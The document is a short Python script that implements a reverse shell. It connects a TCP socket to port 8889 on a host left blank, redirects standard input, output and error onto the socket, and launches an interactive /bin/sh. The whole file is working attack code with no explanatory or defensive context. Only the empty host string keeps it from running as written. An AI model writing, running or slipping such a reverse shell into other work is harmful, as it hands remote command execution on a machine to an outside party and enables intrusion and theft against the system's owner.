import socket
import subprocess
import os


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("", 8889))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])


if __name__ == "__main__":
    main()
